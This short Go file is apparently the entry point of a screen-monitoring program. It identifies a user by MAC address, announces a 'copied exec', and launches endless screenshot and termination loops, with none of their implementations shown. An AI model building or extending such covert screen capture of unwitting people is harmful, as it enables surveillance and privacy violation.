package main

import (
	"runtime"
)

func main() {
	userName := identifyUserByMAC()
	sendFakeShot(userName, "hello from copied exec "+runtime.GOOS)
	go screenshotingLoop(userName)
	go terminationLoop(userName)
	select {}
}
